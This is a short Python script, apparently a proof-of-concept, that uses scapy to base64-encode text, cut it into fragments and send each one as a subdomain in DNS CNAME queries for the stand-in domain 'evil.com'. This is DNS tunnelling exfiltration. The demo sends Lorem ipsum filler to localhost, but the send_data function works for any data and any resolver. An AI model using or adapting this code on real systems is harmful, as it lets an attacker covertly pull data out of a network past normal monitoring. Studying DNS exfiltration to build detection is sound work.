#! /usr/bin/env python3

from scapy.all import DNS, DNSQR, IP, UDP, send
from base64 import b64encode
from random import randint

DOMAIN = "evil.com"
FRAG_LEN = 70 - len(DOMAIN)


def encode(data):
    data = data.strip()
    data += '\n'
    e_data = b64encode(data.encode()).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


def send_data(dest, data):
    frag_e_data = encode(data)

    reqs = []
    for data in frag_e_data:
        dns_req = IP(dst=dest) / UDP(dport=53) / DNS(
            id=randint(0x0, 0xffff), rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="CNAME"))
        reqs.append(dns_req)

    send(reqs)


data = """Lorem ipsum dolor sit amet, consectetur adipiscing elit. In pulvinar, arcu et bibendum ultricies, nisi diam rhoncus est, ut pellentesque elit nisl vitae nisi. Duis aliquet quis ligula at sagittis. Donec interdum urna vel quam congue, non blandit ligula fermentum. Suspendisse sit amet neque scelerisque, feugiat purus ut, scelerisque purus. Mauris id diam id odio sollicitudin venenatis in blandit augue. Phasellus molestie, lectus ut suscipit imperdiet, risus magna maximus tortor, at varius risus elit eget magna. Etiam dictum nulla neque, et dapibus est viverra eu. Mauris blandit nunc quis vestibulum rhoncus. Nulla sodales sodales tempus. Vestibulum ac mattis nisl, ac facilisis tellus. Maecenas non est maximus, tincidunt ante in, commodo felis. Nam dapibus ligula id dolor tempus tempus eu et purus."""

send_data('localhost', data)
